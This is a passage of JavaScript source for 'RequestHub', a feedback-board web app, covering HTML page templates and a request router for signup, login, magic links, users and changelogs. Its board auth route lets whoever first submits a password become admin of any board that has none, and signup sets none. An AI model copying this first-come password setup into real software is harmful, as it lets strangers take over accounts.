      width: 100%; background: ${accent}; color: #fff; border: none; padding: 10px; border-radius: 8px;
      font-size: 13px; font-weight: 600; cursor: pointer; font-family: inherit;
    }
    .btn-submit:hover { filter: brightness(0.9); }
    .success { text-align: center; padding: 20px 0; }
    .success .check { font-size: 32px; margin-bottom: 8px; }
    .panel-footer { padding: 10px 16px; border-top: 1px solid #2a2935; text-align: center; }
    .panel-footer a { color: #9492a3; font-size: 11.5px; text-decoration: none; }
    .panel-footer a:hover { color: #fff; }
  </style>
</head>
<body>
  <button class="launcher" id="launcher" aria-label="Open feedback">
    <svg viewBox="0 0 24 24"><path d="M21 11.5a8.38 8.38 0 0 1-4.8 7.6 8.5 8.5 0 0 1-9.4-1.2L3 21l1.9-4.3a8.38 8.38 0 0 1-1.2-4.4 8.5 8.5 0 0 1 7.6-8.4 8.38 8.38 0 0 1 9.5 7.1 8.5 8.5 0 0 1 .2 1.5z"/></svg>
  </button>
  <div class="panel">
    <div class="panel-header">
      <h1>Got feedback?</h1>
      <button class="panel-close" id="closeBtn" aria-label="Close">&times;</button>
    </div>
    <div class="panel-body" id="panelBody">
      <p>Tell us what's missing, broken, or could be better.</p>
      <form id="form">
        <div class="field"><input id="title" required maxlength="200" placeholder="What's on your mind?" aria-label="What's on your mind?" /></div>
        <div class="field"><textarea id="description" maxlength="2000" placeholder="More detail (optional)" aria-label="More detail (optional)"></textarea></div>
        <div class="field"><input id="email" type="email" placeholder="Your email (optional)" aria-label="Your email (optional)" /></div>
        <button type="submit" class="btn-submit">Send feedback</button>
      </form>
    </div>
    <div class="panel-footer"><a href="/b/${encodeURIComponent(customerSlug)}" target="_blank" rel="noopener">View full feedback board &#8599;</a></div>
  </div>

  <script>
    var customerSlug = ${JSON.stringify(customerSlug).replace(/</g, "\\u003c")};

    function post(type) {
      window.parent.postMessage({ source: 'requesthub-widget', type: type }, '*');
    }

    document.getElementById('launcher').addEventListener('click', function () {
      document.body.classList.add('open');
      post('open');
    });

    // Lets the host page open this panel from its own button instead of our
    // floating launcher (embed.js's data-target mode) - the host can't reach
    // across the iframe boundary to click our launcher for us, so it asks.
    window.addEventListener('message', function (e) {
      if (!e.data || e.data.source !== 'requesthub-host') return;
      if (e.data.type === 'open') document.body.classList.add('open');
    });

    document.getElementById('closeBtn').addEventListener('click', function () {
      document.body.classList.remove('open');
      post('close');
    });

    document.getElementById('form').addEventListener('submit', function (e) {
      e.preventDefault();
      var title = document.getElementById('title').value.trim();
      if (!title) return;
      var description = document.getElementById('description').value.trim();
      var submitterEmail = document.getElementById('email').value.trim();
      fetch('/api/ideas', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ customerSlug: customerSlug, title: title, description: description, category: 'Feedback', submitterEmail: submitterEmail }),
      })
        .then(function (r) { return r.json(); })
        .then(function () {
          document.getElementById('panelBody').innerHTML =
            '<div class="success"><div class="check">&#10003;</div><div>Thanks! We got it.</div></div>';
        });
    });
  </script>
</body>
</html>`;
}

function loginPage(customerSlug, mode, errorMsg, next, isOwner) {
  const isSetup = mode === "setup";
  const nextPath = next || `/b/${encodeURIComponent(customerSlug)}/admin`;
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>${isSetup ? "Set admin password" : "Log in"} - RequestHub</title>
  ${DESIGN_FONT_LINK}
  <script>${THEME_TOGGLE_SCRIPT}</script>
  <style>
    ${DESIGN_TOKENS}
    body { display: flex; align-items: center; justify-content: center; min-height: 100vh; }
    .card { width: 100%; max-width: 360px; padding: 32px; background: var(--card); border: 1px solid var(--border); border-radius: var(--radius-card); box-sizing: border-box; }
    h1 { font-size: 18px; margin: 0 0 6px; color: var(--text); }
    p { color: var(--text-muted); font-size: 13px; margin: 0 0 18px; line-height: 1.5; }
    input {
      width: 100%; background: var(--surface-2); border: 1px solid var(--border); color: var(--text); border-radius: 8px;
      padding: 10px 12px; font-size: 14px; box-sizing: border-box; margin-bottom: 12px; font-family: inherit;
    }
    button {
      width: 100%; background: var(--accent); color: #fff; border: none; padding: 11px; border-radius: var(--radius-btn);
      font-size: 14px; font-weight: 600; cursor: pointer; font-family: inherit;
    }
    button:hover { background: var(--accent-hover); }
    .error { color: var(--bad); font-size: 12.5px; margin: -4px 0 12px; }
    .back { display: block; text-align: center; margin-top: 16px; color: var(--text-muted); font-size: 12.5px; text-decoration: none; }
    .back:hover { color: var(--text); }
    .divider { display: flex; align-items: center; gap: 10px; margin: 18px 0; color: var(--text-faint); font-size: 11.5px; text-transform: uppercase; letter-spacing: .04em; }
    .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: var(--border); }
    .btn-secondary { background: var(--surface-2); color: var(--text); border: 1px solid var(--border); }
    .btn-secondary:hover { background: var(--surface-3); }
    .magic-note { color: var(--good); font-size: 12.5px; text-align: center; margin: 0; }
  </style>
</head>
<body>
  <div class="card">
    <button type="button" class="theme-toggle" id="themeToggle" title="Toggle dark mode" style="position:fixed;top:16px;right:16px;"></button>
    <h1>${isSetup ? "Set your admin password" : "Admin login"}</h1>
    <p>${
      isSetup
        ? `No admin password is set yet for "${escapeHtml(customerSlug)}". Choose one now - whoever knows it can triage ideas and connect your tools.`
        : `Enter the admin password for "${escapeHtml(customerSlug)}" to continue.`
    }</p>
    ${errorMsg ? `<div class="error">${escapeHtml(errorMsg)}</div>` : ""}
    <form id="form">
      <input id="password" type="password" placeholder="Password" aria-label="Password" required minlength="6" autofocus />
      <button type="submit">${isSetup ? "Set password & continue" : "Log in"}</button>
    </form>

    ${
      isSetup
        ? ""
        : `<div class="divider">or</div>
    <form id="magicForm">
      <input id="magicEmail" type="email" placeholder="Your invited email address" aria-label="Your invited email address" required />
      <button type="submit" class="btn-secondary">Email me a sign-in link</button>
    </form>
    <p class="magic-note" id="magicNote" style="display:none;">If that email is on this board's team, a sign-in link is on its way - check your inbox.</p>`
    }

    <a class="back" href="/b/${encodeURIComponent(customerSlug)}">&larr; Back to board</a>
    ${isOwner ? `<a class="back" href="/owner">&larr; Owner console</a>` : ""}
  </div>
  <script>
    document.getElementById('form').addEventListener('submit', function (e) {
      e.preventDefault();
      var password = document.getElementById('password').value;
      fetch('/api/customers/${encodeURIComponent(customerSlug)}/auth', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ password: password }),
      })
        .then(function (r) { return r.json(); })
        .then(function (d) {
          if (d.ok) {
            window.location.href = ${JSON.stringify(nextPath)};
          } else {
            window.location.href = '/b/${encodeURIComponent(customerSlug)}/login?error=' + encodeURIComponent(d.error || 'Incorrect password');
          }
        });
    });

    var magicForm = document.getElementById('magicForm');
    if (magicForm) {
      magicForm.addEventListener('submit', function (e) {
        e.preventDefault();
        var email = document.getElementById('magicEmail').value;
        var btn = magicForm.querySelector('button');
        btn.disabled = true;
        btn.textContent = 'Sending...';
        fetch('/api/customers/${encodeURIComponent(customerSlug)}/magic-link', {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ email: email }),
        })
          .then(function () {
            magicForm.style.display = 'none';
            document.getElementById('magicNote').style.display = 'block';
          })
          .catch(function () {
            btn.disabled = false;
            btn.textContent = 'Email me a sign-in link';
          });
      });
    }
  </script>
</body>
</html>`;
}

function ownerLoginPage(errorMsg) {
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Owner login - RequestHub</title>
  ${DESIGN_FONT_LINK}
  <script>${THEME_TOGGLE_SCRIPT}</script>
  <style>
    ${DESIGN_TOKENS}
    body { display: flex; align-items: center; justify-content: center; min-height: 100vh; }
    .card { width: 100%; max-width: 360px; padding: 32px; background: var(--card); border: 1px solid var(--border); border-radius: var(--radius-card); box-sizing: border-box; }
    h1 { font-size: 18px; margin: 0 0 6px; color: var(--text); }
    p { color: var(--text-muted); font-size: 13px; margin: 0 0 18px; line-height: 1.5; }
    input {
      width: 100%; background: var(--surface-2); border: 1px solid var(--border); color: var(--text); border-radius: 8px;
      padding: 10px 12px; font-size: 14px; box-sizing: border-box; margin-bottom: 12px; font-family: inherit;
    }
    button {
      width: 100%; background: var(--accent); color: #fff; border: none; padding: 11px; border-radius: var(--radius-btn);
      font-size: 14px; font-weight: 600; cursor: pointer; font-family: inherit;
    }
    button:hover { background: var(--accent-hover); }
    .error { color: var(--bad); font-size: 12.5px; margin: -4px 0 12px; }
    .back { display: block; text-align: center; margin-top: 16px; color: var(--text-muted); font-size: 12.5px; text-decoration: none; }
    .back:hover { color: var(--text); }
  </style>
</head>
<body>
  <div class="card">
    <button type="button" class="theme-toggle" id="themeToggle" title="Toggle dark mode" style="position:fixed;top:16px;right:16px;"></button>
    <h1>RequestHub owner console</h1>
    <p>This is the product-wide admin - every customer on RequestHub, not just one board.</p>
    ${errorMsg ? `<div class="error">${escapeHtml(errorMsg)}</div>` : ""}
    <form id="form">
      <input id="password" type="password" placeholder="Owner password" aria-label="Owner password" required autofocus />
      <button type="submit">Log in</button>
    </form>
    <a class="back" href="/">&larr; Back home</a>
  </div>
  <script>
    document.getElementById('form').addEventListener('submit', function (e) {
      e.preventDefault();
      var password = document.getElementById('password').value;
      fetch('/api/owner/auth', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ password: password }),
      })
        .then(function (r) { return r.json(); })
        .then(function (d) {
          if (d.ok) {
            window.location.href = '/owner';
          } else {
            window.location.href = '/owner/login?error=' + encodeURIComponent(d.error || 'Incorrect password');
          }
        });
    });
  </script>
</body>
</html>`;
}

function ownerDashboardPage(customers, errorMsg) {
  const totalCustomers = customers.length;
  const paidCustomers = customers.filter((c) => c.plan && c.plan !== "free").length;
  const connectedCustomers = customers.filter((c) => c.slackChannel || c.linearTeamId || c.notionPageId).length;
  const totalIdeas = customers.reduce((sum, c) => sum + (c.ideaCount || 0), 0);

  const rows = customers
    .map((c) => {
      const chip = (label, active) =>
        `<span class="tool-chip${active ? " active" : ""}">${active ? "&check; " : ""}${label}</span>`;
      const signedUp = c.createdAt ? new Date(c.createdAt).toLocaleDateString() : "-";
      const lastActivity = c.lastIdeaAt ? new Date(c.lastIdeaAt).toLocaleDateString() : "no ideas yet";
      return `<tr>
        <td>
          <div class="cust-name">${escapeHtml(c.name)}</div>
          <div class="cust-slug">${escapeHtml(c.slug)}</div>
        </td>
        <td><span class="plan-chip plan-${escapeHtml(c.plan)}">${escapeHtml(c.plan)}</span></td>
        <td>
          ${chip("Slack", Boolean(c.slackChannel))}
          ${chip("Linear", Boolean(c.linearTeamId))}
          ${chip("Notion", Boolean(c.notionPageId))}
        </td>
        <td>${c.ideaCount} idea${c.ideaCount === 1 ? "" : "s"} &middot; ${c.totalVotes} vote${c.totalVotes === 1 ? "" : "s"}</td>
        <td>${escapeHtml(lastActivity)}</td>
        <td>${escapeHtml(signedUp)}</td>
        <td>${c.hasFastnOrg ? '<span class="org-chip real">real tenant</span>' : '<span class="org-chip seed">seeded/demo</span>'}</td>
        <td class="actions">
          <a href="/b/${encodeURIComponent(c.slug)}" target="_blank" rel="noopener">Board</a>
          <a href="/b/${encodeURIComponent(c.slug)}/admin" target="_blank" rel="noopener">Triage</a>
        </td>
      </tr>`;
    })
    .join("");

  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Owner console - RequestHub</title>
  ${DESIGN_FONT_LINK}
  <style>
    ${DESIGN_TOKENS}
    .topbar { background: var(--card); border-bottom: 1px solid var(--border); padding: 14px 24px; display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
    .logo-mark { width: 28px; height: 28px; border-radius: 8px; background: var(--accent); color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; }
    .brand { font-weight: 700; font-size: 15px; }
    .back { margin-left: auto; color: var(--text-muted); font-size: 13px; text-decoration: none; }
    .back:hover { color: var(--text); }

    .page { max-width: 1180px; margin: 0 auto; padding: 24px; }
    .page-title { font-size: 20px; font-weight: 700; margin: 0 0 18px; }
    .error { color: var(--bad); font-size: 13px; margin-bottom: 14px; }

    .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 20px; }
    .stat-card { background: var(--card); border: 1px solid var(--border); border-radius: var(--radius-card); padding: 14px 16px; }
    .stat-count { font-size: 22px; font-weight: 700; font-family: "Manrope", monospace; }
    .stat-label { color: var(--text-muted); font-size: 12px; margin-top: 2px; }

    table { width: 100%; border-collapse: collapse; background: var(--card); border: 1px solid var(--border); border-radius: var(--radius-card); overflow: hidden; }
    th { text-align: left; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: .04em; color: var(--text-faint); padding: 10px 14px; border-bottom: 1px solid var(--border); background: var(--surface-2); }
    td { padding: 12px 14px; border-bottom: 1px solid var(--border); font-size: 13px; vertical-align: top; }
    tr:last-child td { border-bottom: none; }
    .cust-name { font-weight: 600; color: var(--text); }
    .cust-slug { color: var(--text-faint); font-size: 11.5px; }
    .plan-chip { display: inline-block; padding: 2px 9px; border-radius: 999px; font-weight: 600; font-size: 11px; background: var(--surface-3); color: var(--text-muted); text-transform: capitalize; }
    .plan-chip.plan-growth, .plan-chip.plan-pro { background: var(--accent-tint); color: var(--accent); }
    .tool-chip { display: inline-block; margin: 0 4px 4px 0; padding: 2px 8px; border-radius: 999px; font-size: 10.5px; font-weight: 600; background: var(--surface-3); color: var(--text-faint); }
    .tool-chip.active { background: var(--good-tint); color: var(--good); }
    .org-chip { font-size: 11px; font-weight: 600; padding: 2px 8px; border-radius: 999px; }
    .org-chip.real { background: var(--good-tint); color: var(--good); }
    .org-chip.seed { background: var(--surface-3); color: var(--text-faint); }
    .actions a { color: var(--accent); text-decoration: none; font-size: 12px; font-weight: 600; margin-right: 10px; }
    .actions a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <div class="topbar">
    <div class="logo-mark">R</div>
    <div class="brand">RequestHub owner console</div>
    <a class="back" href="/owner/logout">Log out</a>
  </div>
  <div class="page">
    <h1 class="page-title">All customers</h1>
    ${errorMsg ? `<div class="error">${escapeHtml(errorMsg)}</div>` : ""}

    <div class="stats">
      <div class="stat-card"><div class="stat-count">${totalCustomers}</div><div class="stat-label">Total customers</div></div>
      <div class="stat-card"><div class="stat-count">${paidCustomers}</div><div class="stat-label">On a paid plan</div></div>
      <div class="stat-card"><div class="stat-count">${connectedCustomers}</div><div class="stat-label">Connected a tool</div></div>
      <div class="stat-card"><div class="stat-count">${totalIdeas}</div><div class="stat-label">Ideas submitted (all customers)</div></div>
    </div>

    <table>
      <thead>
        <tr>
          <th>Customer</th>
          <th>Plan</th>
          <th>Connected tools</th>
          <th>Activity</th>
          <th>Last idea</th>
          <th>Signed up</th>
          <th>Tenant</th>
          <th>Links</th>
        </tr>
      </thead>
      <tbody>
        ${rows || `<tr><td colspan="8" style="text-align:center; color:var(--text-faint); padding:30px;">No customers yet.</td></tr>`}
      </tbody>
    </table>
  </div>
</body>
</html>`;
}

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    if (request.method === "GET" && (url.pathname === "/" || url.pathname === "")) {
      return html(homePage());
    }

    if (request.method === "GET" && url.pathname === "/login") {
      return html(loginLookupPage(url.searchParams.get("error")));
    }

    if (request.method === "GET" && url.pathname === "/owner/login") {
      return html(ownerLoginPage(url.searchParams.get("error")));
    }

    if (request.method === "GET" && url.pathname === "/owner/logout") {
      const res = new Response(null, { status: 302, headers: { Location: "/owner/login" } });
      res.headers.append("Set-Cookie", `${sessionCookieName(OWNER_SLUG)}=; Path=/; Max-Age=0`);
      return res;
    }

    if (request.method === "POST" && url.pathname === "/api/owner/auth") {
      let body;
      try {
        body = await request.json();
      } catch {
        return json({ ok: false, error: "invalid JSON body" }, 400);
      }
      if (!env.OWNER_PASSWORD) {
        return json({ ok: false, error: "Owner login is not configured yet." }, 500);
      }
      const password = (body.password || "").toString();
      if (password !== env.OWNER_PASSWORD) {
        return json({ ok: false, error: "Incorrect password" }, 401);
      }
      const token = await createSessionToken(env, OWNER_SLUG);
      const res = json({ ok: true });
      res.headers.append(
        "Set-Cookie",
        `${sessionCookieName(OWNER_SLUG)}=${token}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=${Math.floor(SESSION_TTL_MS / 1000)}`
      );
      return res;
    }

    if (request.method === "GET" && url.pathname === "/owner") {
      if (!(await requireAuth(request, env, OWNER_SLUG))) {
        return new Response(null, { status: 302, headers: { Location: "/owner/login" } });
      }
      try {
        const data = await callWorkflow(env, LIST_CUSTOMERS_WORKFLOW_ID, {});
        return html(ownerDashboardPage(data?.customers || [], data?.ok ? null : data?.error));
      } catch (err) {
        return html(ownerDashboardPage([], err.message));
      }
    }

    if (request.method === "GET" && url.pathname === "/embed.js") {
      return new Response(embedJs(), {
        headers: { "content-type": "application/javascript; charset=utf-8", "cache-control": "public, max-age=300" },
      });
    }

    if (request.method === "GET" && url.pathname === "/widget.html") {
      const customerSlug = url.searchParams.get("customer") || "demo";
      const rawColor = url.searchParams.get("color") || "";
      const color = /^#[0-9a-fA-F]{3}([0-9a-fA-F]{3})?$/.test(rawColor) ? rawColor : null;
      return html(widgetPage(customerSlug, color));
    }

    if (request.method === "GET" && url.pathname === "/changelog-embed.js") {
      return new Response(changelogEmbedJs(), {
        headers: { "content-type": "application/javascript; charset=utf-8", "cache-control": "public, max-age=300" },
      });
    }

    if (request.method === "GET" && url.pathname === "/changelog-widget.html") {
      const customerSlug = url.searchParams.get("customer") || "demo";
      const rawColor = url.searchParams.get("color") || "";
      const color = /^#[0-9a-fA-F]{3}([0-9a-fA-F]{3})?$/.test(rawColor) ? rawColor : null;
      return html(changelogWidgetPage(customerSlug, color));
    }

    if (request.method === "GET" && url.pathname === "/unsubscribe") {
      const token = url.searchParams.get("token") || "";
      try {
        const data = await callWorkflow(env, UNSUBSCRIBE_FROM_IDEA_WORKFLOW_ID, { token });
        return html(unsubscribePage(data?.ok, data?.ideaTitle, data?.error));
      } catch (err) {
        return html(unsubscribePage(false, null, err.message));
      }
    }

    if (request.method === "GET" && url.pathname === "/signup") {
      return html(signupPage(url.searchParams.get("error")));
    }

    if (request.method === "GET" && url.pathname === "/signup/done") {
      const customerSlug = url.searchParams.get("slug") || "";
      if (!customerSlug) {
        return new Response(null, { status: 302, headers: { Location: "/signup" } });
      }
      return html(signupDonePage(customerSlug, url.origin));
    }

    if (request.method === "POST" && url.pathname === "/api/signup") {
      let body;
      try {
        body = await request.json();
      } catch {
        return json({ ok: false, error: "invalid JSON body" }, 400);
      }
      const name = (body.name || "").trim();
      if (!name) {
        return json({ ok: false, error: "Company name is required" }, 400);
      }
      const slug = slugify(name);
      if (slug.length < 3) {
        return json({ ok: false, error: "That name doesn't make a usable URL - try adding more letters" }, 400);
      }
      const existingOrgId = await getTenantOrgId(env, slug);
      if (existingOrgId) {
        return json({ ok: false, error: `"${slug}" is already taken - try a different name` }, 409);
      }
      try {
        const org = await createOrg(env, name, slug);
        await Promise.all(
          CONNECT_WIDGETS.map((w) =>
            createInstallationForTenant(env, w.widgetId, org.id, `${slug} - Connect ${w.name}`)
          )
        );
        await callWorkflow(env, SET_CUSTOMER_ORG_WORKFLOW_ID, { customerSlug: slug, orgId: org.id, name });
        return json({ ok: true, slug });
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const boardMatch = url.pathname.match(/^\/b\/([a-z0-9-]+)\/?$/);
    if (request.method === "GET" && boardMatch) {
      const isOwner = await requireAuth(request, env, OWNER_SLUG);
      return html(boardPage(boardMatch[1], isOwner));
    }

    const ideaDetailMatch = url.pathname.match(/^\/b\/([a-z0-9-]+)\/ideas\/(\d+)\/?$/);
    if (request.method === "GET" && ideaDetailMatch) {
      const isOwner = await requireAuth(request, env, OWNER_SLUG);
      const isAdmin = await requireAuth(request, env, ideaDetailMatch[1]);
      // Server-fetched once, just for <title>/meta tags - the page's own
      // client-side JS still does its normal fetch to actually render the
      // idea. Without this, every single idea on every board shared a
      // generic "Idea - demo - RequestHub" title no matter which idea you
      // linked to, so a shared permalink was indistinguishable from any
      // other idea's link in a browser tab, bookmark, or chat unfurl.
      let metaTitle = null;
      let metaDescription = null;
      try {
        const listData = await callWorkflow(env, LIST_WORKFLOW_ID, { customerSlug: ideaDetailMatch[1] });
        const found = (listData?.ideas || []).find((i) => i.id === Number(ideaDetailMatch[2]));
        if (found) {
          metaTitle = found.title;
          metaDescription = found.description || null;
        }
      } catch {}
      return html(ideaDetailPage(ideaDetailMatch[1], ideaDetailMatch[2], isOwner, isAdmin, metaTitle, metaDescription));
    }

    const loginMatch = url.pathname.match(/^\/b\/([a-z0-9-]+)\/login\/?$/);
    if (request.method === "GET" && loginMatch) {
      const customerSlug = loginMatch[1];
      const errorMsg = url.searchParams.get("error");
      const isOwner = await requireAuth(request, env, OWNER_SLUG);
      try {
        const auth = await callWorkflow(env, GET_CUSTOMER_AUTH_WORKFLOW_ID, { customerSlug });
        const mode = auth?.hash ? "login" : "setup";
        return html(loginPage(customerSlug, mode, errorMsg, null, isOwner));
      } catch (err) {
        return html(loginPage(customerSlug, "login", "Could not check auth status - try again.", null, isOwner));
      }
    }

    const logoutMatch = url.pathname.match(/^\/b\/([a-z0-9-]+)\/logout\/?$/);
    if (request.method === "GET" && logoutMatch) {
      const customerSlug = logoutMatch[1];
      const res = new Response(null, { status: 302, headers: { Location: `/b/${encodeURIComponent(customerSlug)}` } });
      res.headers.append("Set-Cookie", `${sessionCookieName(customerSlug)}=; Path=/; Max-Age=0`);
      return res;
    }

    const authMatch = url.pathname.match(/^\/api\/customers\/([a-z0-9-]+)\/auth$/);
    if (request.method === "POST" && authMatch) {
      const customerSlug = authMatch[1];
      let body;
      try {
        body = await request.json();
      } catch {
        return json({ ok: false, error: "invalid JSON body" }, 400);
      }
      const password = (body.password || "").toString();
      if (password.length < 6) {
        return json({ ok: false, error: "Password must be at least 6 characters" }, 400);
      }
      try {
        const existing = await callWorkflow(env, GET_CUSTOMER_AUTH_WORKFLOW_ID, { customerSlug });
        let authenticated;
        if (!existing?.hash) {
          const { hash, salt } = await hashPassword(password);
          await callWorkflow(env, SET_CUSTOMER_PASSWORD_WORKFLOW_ID, { customerSlug, hash, salt });
          authenticated = true;
        } else {
          const { hash } = await hashPassword(password, existing.salt);
          authenticated = hash === existing.hash;
        }
        if (!authenticated) {
          return json({ ok: false, error: "Incorrect password" }, 401);
        }
        const token = await createSessionToken(env, customerSlug);
        const res = json({ ok: true });
        res.headers.append(
          "Set-Cookie",
          `${sessionCookieName(customerSlug)}=${token}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=${Math.floor(SESSION_TTL_MS / 1000)}`
        );
        return res;
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const magicLinkMatch = url.pathname.match(/^\/api\/customers\/([a-z0-9-]+)\/magic-link$/);
    if (request.method === "POST" && magicLinkMatch) {
      const customerSlug = magicLinkMatch[1];
      let body;
      try {
        body = await request.json();
      } catch {
        return json({ ok: false, error: "invalid JSON body" }, 400);
      }
      const email = (body.email || "").trim().toLowerCase();
      if (!email) {
        return json({ ok: false, error: "email is required" }, 400);
      }
      const token = base64UrlEncode(crypto.getRandomValues(new Uint8Array(32)));
      const loginUrl = `${url.origin}/b/${encodeURIComponent(customerSlug)}/magic?token=${encodeURIComponent(token)}`;
      try {
        await callWorkflow(env, SEND_MAGIC_LINK_WORKFLOW_ID, { customerSlug, email, token, loginUrl });
      } catch {}
      // Always ok:true regardless of whether the email is actually on the team, so this
      // endpoint can't be used to enumerate which addresses have access to a given board.
      return json({ ok: true });
    }

    const magicVerifyMatch = url.pathname.match(/^\/b\/([a-z0-9-]+)\/magic\/?$/);
    if (request.method === "GET" && magicVerifyMatch) {
      const customerSlug = magicVerifyMatch[1];
      const token = url.searchParams.get("token") || "";
      try {
        const result = await callWorkflow(env, VERIFY_MAGIC_LINK_WORKFLOW_ID, { token });
        if (!result?.ok || result.customerSlug !== customerSlug) {
          return html(loginPage(customerSlug, "login", result?.error || "That sign-in link is invalid or expired."));
        }
        const sessionToken = await createSessionToken(env, customerSlug, result.email);
        const res = new Response(null, {
          status: 302,
          headers: { Location: `/b/${encodeURIComponent(customerSlug)}/admin` },
        });
        res.headers.append(
          "Set-Cookie",
          `${sessionCookieName(customerSlug)}=${sessionToken}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=${Math.floor(SESSION_TTL_MS / 1000)}`
        );
        return res;
      } catch (err) {
        return html(loginPage(customerSlug, "login", "Could not verify that link - try again."));
      }
    }

    const usersMatch = url.pathname.match(/^\/api\/customers\/([a-z0-9-]+)\/users$/);
    if (request.method === "GET" && usersMatch) {
      const customerSlug = usersMatch[1];
      if (!(await requireAuth(request, env, customerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      try {
        const data = await callWorkflow(env, LIST_USERS_WORKFLOW_ID, { customerSlug });
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message, users: [] }, 502);
      }
    }
    if (request.method === "POST" && usersMatch) {
      const customerSlug = usersMatch[1];
      if (!(await requireAuth(request, env, customerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      let body;
      try {
        body = await request.json();
      } catch {
        return json({ ok: false, error: "invalid JSON body" }, 400);
      }
      try {
        const data = await callWorkflow(env, ADD_USER_WORKFLOW_ID, { customerSlug, email: body.email });
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const removeUserMatch = url.pathname.match(/^\/api\/customers\/([a-z0-9-]+)\/users\/remove$/);
    if (request.method === "POST" && removeUserMatch) {
      const customerSlug = removeUserMatch[1];
      if (!(await requireAuth(request, env, customerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      let body;
      try {
        body = await request.json();
      } catch {
        return json({ ok: false, error: "invalid JSON body" }, 400);
      }
      try {
        const data = await callWorkflow(env, REMOVE_USER_WORKFLOW_ID, { customerSlug, email: body.email });
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message }, 502);
      }
    }

    const roadmapMatch = url.pathname.match(/^\/b\/([a-z0-9-]+)\/roadmap\/?$/);
    if (request.method === "GET" && roadmapMatch) {
      const isOwner = await requireAuth(request, env, OWNER_SLUG);
      return html(roadmapPage(roadmapMatch[1], isOwner));
    }

    const changelogMatch = url.pathname.match(/^\/b\/([a-z0-9-]+)\/changelog\/?$/);
    if (request.method === "GET" && changelogMatch) {
      const isOwner = await requireAuth(request, env, OWNER_SLUG);
      return html(changelogPage(changelogMatch[1], isOwner));
    }

    const changelogApiMatch = url.pathname.match(/^\/api\/customers\/([a-z0-9-]+)\/changelog\/?$/);
    if (request.method === "GET" && changelogApiMatch) {
      try {
        const data = await callWorkflow(env, LIST_CHANGELOG_WORKFLOW_ID, { customerSlug: changelogApiMatch[1] });
        return json(data);
      } catch (err) {
        return json({ ok: false, error: err.message, items: [] }, 502);
      }
    }

    const changelogRssMatch = url.pathname.match(/^\/b\/([a-z0-9-]+)\/changelog\.rss$/);
    if (request.method === "GET" && changelogRssMatch) {
      const customerSlug = changelogRssMatch[1];
      try {
        const data = await callWorkflow(env, LIST_CHANGELOG_WORKFLOW_ID, { customerSlug });
        const items = data?.items || [];
        const siteUrl = `${url.origin}/b/${encodeURIComponent(customerSlug)}/changelog`;
        const xmlEscape = (s) =>
          String(s ?? "")
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&apos;");
        const rssItems = items
          .map(
            (it) => `<item>
      <title>${xmlEscape(it.title)}</title>
      <link>${xmlEscape(siteUrl)}</link>
      <guid isPermaLink="false">${customerSlug}-changelog-${it.id}</guid>
      <pubDate>${new Date(it.shipped_at).toUTCString()}</pubDate>
      <category>${xmlEscape(it.category)}</category>
      <description>${xmlEscape(it.description || "")}</description>
    </item>`
          )
          .join("\n    ");
        const xml = `<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>${xmlEscape(customerSlug)} changelog</title>
    <link>${xmlEscape(siteUrl)}</link>
    <description>What's new on ${xmlEscape(customerSlug)}'s RequestHub board</description>
    ${rssItems}
  </channel>
</rss>`;
        return new Response(xml, { headers: { "content-type": "application/rss+xml; charset=utf-8" } });
      } catch (err) {
        return new Response("Failed to build feed: " + err.message, { status: 502 });
      }
    }

    const adminMatch = url.pathname.match(/^\/b\/([a-z0-9-]+)\/admin\/?$/);
    if (request.method === "GET" && adminMatch) {
      const customerSlug = adminMatch[1];
      const isOwner = await requireAuth(request, env, OWNER_SLUG);
      if (!(await requireAuth(request, env, customerSlug))) {
        return new Response(null, {
          status: 302,
          headers: { Location: `/b/${encodeURIComponent(customerSlug)}/login` },
        });
      }
      return html(adminPage(customerSlug, isOwner));
    }

    const analyticsMatch = url.pathname.match(/^\/b\/([a-z0-9-]+)\/analytics\/?$/);
    if (request.method === "GET" && analyticsMatch) {
      const customerSlug = analyticsMatch[1];
      const isOwner = await requireAuth(request, env, OWNER_SLUG);
      if (!(await requireAuth(request, env, customerSlug))) {
        return new Response(null, {
          status: 302,
          headers: { Location: `/b/${encodeURIComponent(customerSlug)}/login` },
        });
      }
      return html(analyticsPage(customerSlug, isOwner));
    }

    const statsMatch = url.pathname.match(/^\/api\/customers\/([a-z0-9-]+)\/stats$/);
    if (request.method === "GET" && statsMatch) {
      const customerSlug = statsMatch[1];
      if (!(await requireAuth(request, env, customerSlug))) {
        return json({ ok: false, error: "unauthorized" }, 401);
      }
      try {
        const data = await callWorkflow(env, GET_BOARD_STATS_WORKFLOW_ID, { customerSlug });
        return json(data);
      } catch (err) {
